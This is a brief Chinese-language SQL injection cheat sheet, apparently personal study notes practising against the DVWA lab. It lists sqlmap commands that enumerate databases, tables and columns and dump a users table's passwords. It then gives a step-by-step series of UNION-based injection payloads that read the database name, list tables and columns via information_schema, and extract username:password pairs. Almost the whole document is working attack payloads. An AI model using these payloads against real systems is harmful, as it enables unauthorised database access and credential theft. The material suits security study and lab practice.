<!-- 
title: 04-Sql注入
sort: 
--> 

## Sqlmap

> 查询数据库
>
> `sqlmap -r xxx -p pwd --dbs`
>
> 使用url
>
> `sqlmap -u http://xxx -p pwd --dbs`
>
> 指定数据库下的数据表
>
> `sqlmap -r xxx -p id -D dvwa --tables`
>
> 表中的全部列
>
> `sqlmap -r xxx -p id -D dvwa -T users --columns`
>
> 表中的具体字段
>
> `sqlmap -r xxx -p id -D dvwa -T users -C user_id,avatar,password --dump`

## 联合查询

1. 判断列数

   `1' order by 3 --+ `

2. 判断值对应的列数

   `0' union select 1,2,3 --+ `

3. 查询用户及数据库信息

   ` 0' union select 1,user(),database() --+`

4. 查询表名

   `0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`

5. 查询列名

   `0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`

6. 查询信息

   `0' union select 1,group_concat(username,0x3a,password),3 from users --+`

